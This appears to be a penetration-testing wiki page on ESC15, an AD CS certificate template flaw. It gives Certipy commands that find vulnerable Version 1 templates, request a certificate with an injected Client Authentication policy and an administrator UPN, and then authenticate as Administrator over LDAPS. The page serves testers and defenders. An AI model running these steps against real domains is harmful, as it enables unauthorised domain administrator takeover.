# ESC15

ESC15, also called "EKUwu," is a vulnerability in Active Directory Certificate Services (AD CS) affecting **unpatched Certificate Authorities (CAs)** using **Version 1 templates**.

The issue allows an attacker to inject **arbitrary Application Policies** into a certificate request. If the CA is unpatched (pre-Nov 2024), it may incorrectly include these policies in the issued certificate—even if they contradict the template’s intended EKUs (Extended Key Usages).

#### **How It Works**

* Version 1 templates are limited and don't have a separate Application Policies configuration.
* If the template allows "Enrollee supplies subject," the attacker can submit a CSR with their own Application Policies.
* The unpatched CA blindly includes them in the certificate.

When it works an attacker is able to **make a certificate request** to escalate his privileges.

{% embed url="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu" %}

## Identification with Certipy

{% code overflow="wrap" %}
```bash
certipy find -u 'USER@DOMAIN.COM' -p 'PASSOWRD' -dc-ip DC_IP -vulnerable -enabled
```
{% endcode %}



## Exploitation with Certipy

Certipy's `req` command, using the `-application-policies` parameter, allows attackers to specify OIDs to be injected into the Application Policies extension of the CSR. This is the mechanism used to exploit ESC15 on an unpatched CA.

{% code overflow="wrap" %}
```bash
certipy req -u 'USER@DOMAIN.COM' -p 'PASS' -dc-ip 'DC_IP' -target 'DC_NAME' -ca 'CA_NAME' -template 'WebServer' -upn 'administrator@DOMAIN.COM' -sid 'DOMAIN-SID-500' -application-policies 'Client Authentication'
```
{% endcode %}

* `-template 'WebServer'`: The vulnerable V1 template with "Enrollee supplies subject".
* `-application-policies 'Client Authentication'`: Injects the OID `1.3.6.1.5.5.7.3.2` into the Application Policies extension of the CSR.
* `-upn 'administrator@corp.local'`: Sets the UPN in the SAN for impersonation.



## Authenticate via Schannel (LDAPS) using the obtained certificate

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip 'DC_IP' -ldap-shell
```

The attacker is authenticated as `CORP\Administrator` over LDAPS because Schannel on the DC honored the injected "Client Authentication" Application Policy.

